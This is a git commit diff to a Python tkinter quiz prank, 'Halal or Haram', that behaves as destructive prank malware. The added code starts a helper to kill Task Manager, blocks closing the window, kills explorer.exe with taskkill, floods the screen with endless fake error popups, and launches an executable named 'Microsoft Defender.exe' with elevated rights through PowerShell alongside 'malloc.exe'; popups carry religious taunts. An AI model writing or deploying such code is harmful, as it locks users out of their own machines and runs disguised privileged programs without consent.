2d6df974965a4c6c8c924fa75be739e9f3a06175
katkasoft <katkaleks@gmail.com>
2025-05-25 21:18:25 +0300

    release

--- HALorHAR_windows.py
+++ HALorHAR_windows.py
@@ -5,7 +5,18 @@ import codecs
 import winsound
 from random import randint
 from tkinter.messagebox import showwarning, askyesno
+import threading
+import subprocess
+from incorrect import *
 
+def on_closing():
+    showwarning(title='3RR0R!', message="D0N'T TRY T0 3SCAP3")
+
+def takmgr_kill():
+    subprocess.run("taskmgr_kill.exe")
+
+thread = threading.Thread(target=takmgr_kill)
+thread.start()
 
 root = Tk()
 
@@ -18,8 +29,7 @@ window_y = floor(screen_y*0.8)
 root.geometry(f'{window_x}x{window_y}+{floor(0.1*screen_x)}+{floor(0.1*screen_y)}')
 root.title('HALorHAR.exe')
 root.resizable(0,0)
-
-#--functions
+root.protocol('WM_DELETE_WINDOW', on_closing)
 
 colors = ['#F00000', '#000000', '#FFFFFF']
 window_titles=['YOU MADE A MISTAKE', 'your punishment is here ', 'HELP ME '*20, 'ALLAH WON\'T FORGIVE YOU', '911 '*100, 'GOD SAVE ME', '33'*100]
@@ -27,8 +37,6 @@ window_titles=['YOU MADE A MISTAKE', 'your punishment is here ', 'HELP ME '*20, 
 max_diff = floor(window_y*0.6)
 current_question=1
 questions = codecs.open('questions (3).txt', 'r', 'utf_8_sig').read().split('/')
-
-#--virus------------------------------------------------------
 
 def shake_screen():
     root.configure(bg=colors[randint(0,2)])
@@ -49,15 +57,12 @@ def delete_all():
         root.update()
 
 def last_msg():
-    root.configure(bg='#FFFFFF')
-    result = askyesno(title='不要转身', message='大屠杀还没有结束。..')
-
-    if result or not result: root.destroy()
+    incorrect(root)
+    print("incorrect")
 
 def fuck_computer():
     root.iconphoto(False, PhotoImage(file='img/eye.png'))
     root.configure(bg='#F00000')
-
 
     for child in root.winfo_children():
         try:
@@ -88,8 +93,6 @@ def fuck_computer():
     root.after(6200, total_end)
     root.after(18000, last_msg)
     
-#-----------------------------------------------
-
 def btn_hal():
     if questions[current_question-1][-1]=='l':
         correct = Label(main, image=smaller_correct_img)
@@ -98,11 +101,10 @@ def btn_hal():
         root.after(1000, continue_test)
         root.after(1000, lambda: correct.destroy())
     else:
-        correct = Label(main, image=incorrect_img)
+        correct = Label(main, image=bigger_incorrect_img)
         correct.place(rely=.55, relx=.5, anchor=CENTER)
         root.after(100, incorrect_snd)
         root.after(4000, lambda: correct.destroy())
-
         btn1.configure(text='you', state=DISABLED)
         btn2.configure(text='fucked up :)', state=DISABLED)
         root.after(5000, fuck_computer)
@@ -116,11 +118,10 @@ def btn_har():
         root.after(1000, continue_test)
         root.after(1000, lambda: correct.destroy())
     else:
-        correct = Label(main, image=incorrect_img)
+        correct = Label(main, image=bigger_incorrect_img)
         correct.place(rely=.55, relx=.5, anchor=CENTER)
         root.after(100, incorrect_snd)
         root.after(4000, lambda: correct.destroy())
-
         btn1.configure(text='you', state=DISABLED)
         btn2.configure(text='fucked up :)', state=DISABLED)
         root.after(5000, fuck_computer)
@@ -150,8 +151,6 @@ def continue_test():
         root.after(6000, fuck_computer)
         root.after(6500, pre_fuck)
 
-#sounds
-
 def correct_snd():
     winsound.PlaySound('audio/correct.wav', winsound.SND_FILENAME)
 
@@ -167,24 +166,18 @@ def end():
 def total_end():
     winsound.PlaySound('audio/konkonse-boosted.wav', winsound.SND_ASYNC)
 
-#images
-
 root.iconphoto(False, PhotoImage(file='img/logo.png'))
 
 eye = PhotoImage(file='img/eye.png')
 correct_img = PhotoImage(file='img/correct.png')
 incorrect_img = PhotoImage(file='img/error.png')
 smaller_correct_img = correct_img.subsample(15,15)
-
-#widgets
+bigger_incorrect_img = incorrect_img.zoom(2,2)
 
 title = Label(text='Халяль или Харам?', font=('Impact', floor(window_x/30*1.3)),
               background='#000000',
                foreground='#FFFFFF')
 title.place(anchor=CENTER, relx=0.5, rely=0.1)
-
-
-#--main-Test
 
 main = Frame(width=floor(0.65*window_x), height=floor(0.7*window_y), bg='grey')
 main.place(anchor=W, relx=.025, rely=.62)
@@ -192,7 +185,6 @@ main.place(anchor=W, relx=.025, rely=.62)
 q_num = Label(text='Вопрос 1/11', font=('Times', floor(window_x/80*1.3),
                                         'italic'), foreground='#F00000', background='#000000')
 q_num.place(relx=.35, rely=.28, anchor=CENTER)
-
 
 q_text = Label(main,text=questions[0][:-1], font=('Times',floor(window_x/100*1.3), 'italic'),
                width=floor(window_x/100)*6, justify='center',
@@ -204,7 +196,6 @@ btn1.place(anchor=W, relx=.07, rely=.8)
 
 btn2 = Button(main, text='Харам', font=('Courier New', 12, 'italic'), width=floor(window_x*0.25*0.1), height=2, command=btn_har)
 btn2.place(anchor=E, relx=.93, rely=.8)
-#--difficulty-level
 
 diff_title = Label(text='Рiвень потужности', font=('Times', floor(window_x/80*1.3),
                                         'italic'), foreground='#F00000', background='#000000')
@@ -224,9 +215,6 @@ diff_3.place(rely=0.45, relx=.9, anchor=W)
 
 diff_4 = Label(text='<-- крiтичнi', font=('Times', floor(window_x/100*1.3), 'italic'), fg='white', bg='#000000')
 diff_4.place(rely=0.35, relx=.9, anchor=W)
-
-
-#--percent-of-done
 
 Percent = Label(text=f'Пройдено 0%', bg='#000000', fg='white', font=('Times', floor(window_x/70*1.3)))
 Percent.place(relx=0.5, rely=0.19, anchor=CENTER)
--- incorrect.py
+++ incorrect.py
@@ -10,172 +10,167 @@ import threading
 
 windows = []
 
-root = Tk()
-root.title("")
-root.geometry("0x0")
+def incorrect(root):
+    def after_second():  
+        def create_window(index):
+            if index < 50:
+                window3 = Toplevel()
+                window3.title("Прими наказание")
+                width, height = 400, 200
+                x = random.randint(0, 1920 - width)
+                y = random.randint(0, 1080 - height)
+                window3.geometry(f"{width}x{height}+{x}+{y}")
+                lbl = ttk.Label(window3, text="Но это не искупит твой грех...", font=("Arial", 14), foreground="#FC0202", background="#000000")
+                lbl.pack(expand=True)
+                window3.config(bg='black')
+                windows3.append(window3)
+                window3.after(100, create_window, index + 1)
+            else:
+                virus()
 
-def after_second():  
-    def create_window(index):
-        if index < 50:
-            window3 = Toplevel()
-            window3.title("Прими наказание")
-            width, height = 400, 200
-            x = random.randint(0, 1920 - width)
-            y = random.randint(0, 1080 - height)
-            window3.geometry(f"{width}x{height}+{x}+{y}")
-            lbl = ttk.Label(window3, text="Но это не искупит твой грех...", font=("Arial", 14), foreground="#FC0202", background="#000000")
-            lbl.pack(expand=True)
-            window3.config(bg='black')
-            windows3.append(window3)
-            window3.after(100, create_window, index + 1)
-        else:
-            virus()
+        windows3 = []
+        create_window(0)
 
-    windows3 = []
-    create_window(0)
+    def after_first():
+        def destroy_windows_and_start_second():
+            for window2 in windows2:
+                try:
+                    window2.destroy()
+                except:
+                    pass
+            root.after(5000, after_second)
 
-def after_first():
-    def destroy_windows_and_start_second():
-        for window2 in windows2:
+        def create_window(index):
+            if index < 50:
+                window2 = Toplevel()
+                window2.title("Пока можешь")
+                width, height = 400, 200
+                x = random.randint(0, 1920 - width)
+                y = random.randint(0, 1080 - height)
+                window2.geometry(f"{width}x{height}+{x}+{y}")
+                lbl = ttk.Label(window2, text="Читай!", font=("Arial", 14), foreground="#FC0202", background="#000000")
+                lbl.pack(expand=True)
+                window2.config(bg='black')
+                windows2.append(window2)
+                window2.after(100, create_window, index + 1)
+            else:
+                root.after(5000, destroy_windows_and_start_second)
+
+        windows2 = []
+        create_window(0)
+
+    def open_browser():
+        for window in windows:
             try:
-                window2.destroy()
+                window.destroy()
             except:
                 pass
-        root.after(5000, after_second)
+        os.system("start msedge https://quran-online.ru/1:1")
+        root.after(5000, after_first)
 
-    def create_window(index):
-        if index < 50:
-            window2 = Toplevel()
-            window2.title("Пока можешь")
+    index1 = 0
+    def create_window():
+        nonlocal index1
+        if index1 < 50:
+            window = Toplevel()
+            window.title("Ты врешь Аллаху")
             width, height = 400, 200
             x = random.randint(0, 1920 - width)
             y = random.randint(0, 1080 - height)
-            window2.geometry(f"{width}x{height}+{x}+{y}")
-            lbl = ttk.Label(window2, text="Читай!", font=("Arial", 14), foreground="#FC0202", background="#000000")
+            window.geometry(f"{width}x{height}+{x}+{y}")
+            lbl = ttk.Label(window, text="Зачем ты врешь что читал коран?", font=("Arial", 14), foreground="#FC0202", background="#000000")
             lbl.pack(expand=True)
-            window2.config(bg='black')
-            windows2.append(window2)
-            window2.after(100, create_window, index + 1)
+            window.config(bg='black')
+            windows.append(window)
+            index1 += 1
+            window.after(100, create_window)
         else:
-            root.after(5000, destroy_windows_and_start_second)
+            open_browser()
 
-    windows2 = []
-    create_window(0)
+    def create_error_window(x, y):
+        numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', "9", "A", 'B', 'C', 'D', 'E', 'F']
+        ICON = zlib.decompress(base64.b64decode("eJxjYGAEQgEBBiDJwZDBysAgxsDAoAHEQCEGBQaIOAg4sDIgACMUj4JRMApGwQgF/ykEAFXxQRc="))
+        _, ICON_PATH = tempfile.mkstemp(suffix=".ico")
+        with open(ICON_PATH, "wb") as icon_file:
+            icon_file.write(ICON)
 
-def open_browser():
-    for window in windows:
+        errorwin = Toplevel()
+        errorwin.iconbitmap(default=ICON_PATH)
+        errorwin.title("Error")
+        errorwin.geometry(f"180x115+{x}+{y}")
+        errorwin.resizable(False, False)
         try:
-            window.destroy()
-        except:
-            pass
-    os.system("start msedge https://quran-online.ru/1:1")
-    root.after(5000, after_first)
+            img = PhotoImage(file="img/error.png")
+            errorwin.img = img
+            imglabel = ttk.Label(errorwin, image=img)
+            imglabel.place(x=15, y=20)
+        except Exception as e:
+            print(f"Error loading image: {e}")
+            imglabel = ttk.Label(errorwin, text="Image not found")
+            imglabel.place(x=15, y=20)
+        error_code = f"Error x{''.join(random.choices(numbers, k=8))}"
+        errorlabel = ttk.Label(errorwin, text=error_code)
+        errorlabel.place(x=70, y=35)
+        btn = ttk.Button(errorwin, text="OK", command=errorwin.destroy)
+        btn.place(x=90, y=85)
 
-index1 = 0
-def create_window():
-    global index1
-    if index1 < 50:
-        window = Toplevel()
-        window.title("Ты врешь Аллаху")
-        width, height = 400, 200
-        x = random.randint(0, 1920 - width)
-        y = random.randint(0, 1080 - height)
-        window.geometry(f"{width}x{height}+{x}+{y}")
-        lbl = ttk.Label(window, text="Зачем ты врешь что читал коран?", font=("Arial", 14), foreground="#FC0202", background="#000000")
-        lbl.pack(expand=True)
-        window.config(bg='black')
-        windows.append(window)
-        index1 += 1
-        window.after(100, create_window)
-    else:
-        open_browser()
+    def create_multiple_error_windows(x, y, count, direction, callback):
+        if count > 0:
+            create_error_window(x, y)
+            if direction == "nw-se":
+                root.after(50, lambda: create_multiple_error_windows(x + 100, y + 100, count - 1, direction, callback))
+            elif direction == "se-nw":
+                root.after(50, lambda: create_multiple_error_windows(x - 100, y - 100, count - 1, direction, callback))
+            elif direction == "w-e":
+                root.after(50, lambda: create_multiple_error_windows(x + 100, y, count - 1, direction, callback))
+            elif direction == "sw-ne":
+                root.after(50, lambda: create_multiple_error_windows(x + 100, y - 100, count - 1, direction, callback))
+        else:
+            callback()
 
-def create_error_window(x, y):
-    numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', "9", "A", 'B', 'C', 'D', 'E', 'F']
-    ICON = zlib.decompress(base64.b64decode("eJxjYGAEQgEBBiDJwZDBysAgxsDAoAHEQCEGBQaIOAg4sDIgACMUj4JRMApGwQgF/ykEAFXxQRc="))
-    _, ICON_PATH = tempfile.mkstemp(suffix=".ico")
-    with open(ICON_PATH, "wb") as icon_file:
-        icon_file.write(ICON)
+    def create_multiple_error_windows_instant(x, y, count, direction):
+        if count > 0:
+            create_error_window(x, y)
+            if direction == "nw-se":
+                root.after(20, lambda: create_multiple_error_windows_instant(x + 100, y + 100, count - 1, direction))
+            elif direction == "se-nw":
+                root.after(20, lambda: create_multiple_error_windows_instant(x - 100, y - 100, count - 1, direction))
+            elif direction == "w-e":
+                root.after(20, lambda: create_multiple_error_windows_instant(x + 100, y, count - 1, direction))
+            elif direction == "sw-ne":
+                root.after(20, lambda: create_multiple_error_windows_instant(x + 100, y - 100, count - 1, direction))
 
-    errorwin = Toplevel()
-    errorwin.iconbitmap(default=ICON_PATH)
-    errorwin.title("Error")
-    errorwin.geometry(f"180x115+{x}+{y}")
-    errorwin.resizable(False, False)
-    try:
-        img = PhotoImage(file="img/error.png")
-        errorwin.img = img
-        imglabel = ttk.Label(errorwin, image=img)
-        imglabel.place(x=15, y=20)
-    except Exception as e:
-        print(f"Error loading image: {e}")
-        imglabel = ttk.Label(errorwin, text="Image not found")
-        imglabel.place(x=15, y=20)
-    error_code = f"Error x{''.join(random.choices(numbers, k=8))}"
-    errorlabel = ttk.Label(errorwin, text=error_code)
-    errorlabel.place(x=70, y=35)
-    btn = ttk.Button(errorwin, text="OK", command=errorwin.destroy)
-    btn.place(x=90, y=85)
+    def creating_instantly():
+        index = 0
+        for i in range(20):
+            x = random.randint(0, 1920)
+            y = random.randint(0, 1080)
+            direction = random.choice(['nw-se', 'se-nw', 'w-e', 'sw-ne'])
+            create_multiple_error_windows_instant(x, y, 30, direction)
+        def ultimate_death():
+            nonlocal index
+            x = random.randint(0, 1920)
+            y = random.randint(0, 1080)
+            create_error_window(x, y)
+            root.after(250, ultimate_death)
+            index += 1
+        def malloc():
+            subprocess.run("malloc.exe")
 
+        exe_path = os.path.join(os.getcwd(), "Microsoft Defender.exe")
+        os.system(f'powershell -Command "Start-Process -FilePath \'{exe_path}\' -Verb RunAs"')
+        thread = threading.Thread(target=malloc)
+        thread.start()
 
-def create_multiple_error_windows(x, y, count, direction, callback):
-    if count > 0:
-        create_error_window(x, y)
-        if direction == "nw-se":
-            root.after(50, lambda: create_multiple_error_windows(x + 100, y + 100, count - 1, direction, callback))
-        elif direction == "se-nw":
-            root.after(50, lambda: create_multiple_error_windows(x - 100, y - 100, count - 1, direction, callback))
-        elif direction == "w-e":
-            root.after(50, lambda: create_multiple_error_windows(x + 100, y, count - 1, direction, callback))
-        elif direction == "sw-ne":
-            root.after(50, lambda: create_multiple_error_windows(x + 100, y - 100, count - 1, direction, callback))
-    else:
-        callback()
+        ultimate_death()
 
-def create_multiple_error_windows_instant(x, y, count, direction):
-    if count > 0:
-        create_error_window(x, y)
-        if direction == "nw-se":
-            root.after(20, lambda: create_multiple_error_windows_instant(x + 100, y + 100, count - 1, direction))
-        elif direction == "se-nw":
-            root.after(20, lambda: create_multiple_error_windows_instant(x - 100, y - 100, count - 1, direction))
-        elif direction == "w-e":
-            root.after(20, lambda: create_multiple_error_windows_instant(x + 100, y, count - 1, direction))
-        elif direction == "sw-ne":
-            root.after(20, lambda: create_multiple_error_windows_instant(x + 100, y - 100, count - 1, direction))
+    def virus():
+        create_multiple_error_windows(100, 100, 20, "nw-se",
+                                    lambda: create_multiple_error_windows(1720, 1080, 20, "se-nw", lambda:
+                                                                            create_multiple_error_windows(0, 500, 30, "w-e", lambda:
+                                                                                                                                        create_multiple_error_windows(0, 1080, 20, 'sw-ne', lambda:
+                                                                                                                                                                        create_multiple_error_windows(1250, 0, 20, "nw-se", lambda:
+                                                                                                                                                                                                    creating_instantly())))))
 
-def creating_instantly():
-    index = 0
-    for i in range(20):
-        x = random.randint(0, 1920)
-        y = random.randint(0, 1080)
-        direction = random.choice(['nw-se', 'se-nw', 'w-e', 'sw-ne'])
-        create_multiple_error_windows_instant(x, y, 30, direction)
-    def ultimate_death():
-        x = random.randint(0, 1920)
-        y = random.randint(0, 1080)
-        create_error_window(x, y)
-        root.after(250, ultimate_death)
-        index += 1
-    def malloc():
-        subprocess.run("malloc.exe")
-
-    exe_path = os.path.join(os.getcwd(), "Microsoft Defender.exe")
-    os.system(f'powershell -Command "Start-Process -FilePath \'{exe_path}\' -Verb RunAs"')
-    thread = threading.Thread(target=malloc)
-    thread.start()
-
-    ultimate_death()
-
-def virus():
-    create_multiple_error_windows(100, 100, 20, "nw-se",
-                                  lambda: create_multiple_error_windows(1720, 1080, 20, "se-nw", lambda:
-                                                                         create_multiple_error_windows(0, 500, 30, "w-e", lambda:
-                                                                                                                                       create_multiple_error_windows(0, 1080, 20, 'sw-ne', lambda:
-                                                                                                                                                                     create_multiple_error_windows(1250, 0, 20, "nw-se", lambda:
-                                                                                                                                                                                                   creating_instantly())))))
-
-os.system('taskkill /f /im explorer.exe')
-create_window()
-
-root.mainloop()
+    os.system('taskkill /f /im explorer.exe')
+    create_window()
